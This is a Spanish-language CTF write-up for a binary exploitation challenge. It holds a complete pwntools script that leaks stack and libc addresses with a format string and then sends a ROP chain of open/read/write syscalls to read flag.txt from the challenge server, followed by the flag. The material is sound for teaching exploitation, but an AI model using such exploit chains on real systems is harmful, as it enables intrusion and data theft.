# Metared Cine Festival level 2

```
 checksec director_hard
[*] '/home/kalcast/Descargas/pwn2/director_hard'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    RUNPATH:    b'.'
    Stripped:   No
```

Mismas vulnerabildades que el anterior, solo que ahora el stack no es ejecutable así que tendremos que hacer un ret2libc.

Usamos la primera entrada para filtrar direcciones de la pila y el stack y la segunda para almacenar la cadena "flag.txt\00" y escribir nuestra ROP-chain.

```py
#!/usr/bin/env python3

from pwn import *

elf = ELF("./director_hard")
libc = ELF("./libc.so.6")
#ld = ELF("./")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
break main
'''

domain= "challs.ctf.cert.unlp.edu.ar"
port = 41969

def start():
    if args.REMOTE:
        return remote(domain, port)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
        # you need r.interactive() !
    else:
        return process([elf.path])
r = start()

# rop = ROP(elf)
rop = ROP([elf, libc])
# rop = ROP(elf, libc, ld)

#========= exploit here ===================
#r.sendlineafter(b"Input:",b"%8$p")
r.sendlineafter(b"Input:",b"%p.%41$p")
r.recvuntil(b"You entered:")
leak = r.recvline().strip().split(b'.')

libc_base = int(leak[1],16) -  0x29d90
input2_addr =   int(leak[0],16)  + 0x2120
libc.address = libc_base

r.info("libc base: " + hex(libc_base))
r.info("input_addr: " + hex(input2_addr))

pop_rdi = libc_base + 0x000000000002a3e5
pop_rsi = libc_base + 0x000000000002be51
pop_rdx_r12 = libc_base + 0x000000000011f357 # pop rdx ; pop r12 ; ret
pop_rax = libc_base + 0x0000000000045eb0 # pop rax ; ret
syscall = libc_base + rop.find_gadget(['syscall', 'ret'])['address']
print(hex(syscall))

payload = b"flag.txt\x00"
payload += b"A" * (280 - len(payload))
# --- open("flag.txt",O_RDONLY,0) ---
payload += p64(pop_rdi);        payload += p64(input2_addr)
payload += p64(pop_rsi);        payload += p64(0)           # flags = O_RDONLY
payload += p64(pop_rdx_r12);    payload += p64(0)*2         # mode = 0
payload += p64(pop_rax)
payload += p64(2)               # SYS_open
payload += p64(syscall)
# --- read(3,buf,64) ---
payload += p64(pop_rdi);        payload += p64(3)
payload += p64(pop_rsi);        payload += p64(input2_addr + 64)
payload += p64(pop_rdx_r12);    payload += p64(64)
payload += p64(0);              payload += p64(pop_rax)
payload += p64(0)               # SYS_read
payload += p64(syscall)
# --- write(1,buf,size) ---
payload += p64(pop_rdi);        payload += p64(1)
payload += p64(pop_rsi);        payload += p64(input2_addr + 64)
payload += p64(pop_rdx_r12);    payload += p64(64); payload += p64(0)
payload += p64(pop_rax);        
payload += p64(1)               # SYS_write
payload += p64(syscall)
# --- exit(0) ---
payload += p64(pop_rdi);    payload += p64(0)
payload += p64(pop_rax);    payload += p64(60)  # SYS_exit
payload += p64(syscall) 

r.sendlineafter(b"Input:",payload)
r.interactive()
```

`UNLP{4nnnnd-th3-0sc4r-w1nn333rrr-isssss-yoU}`
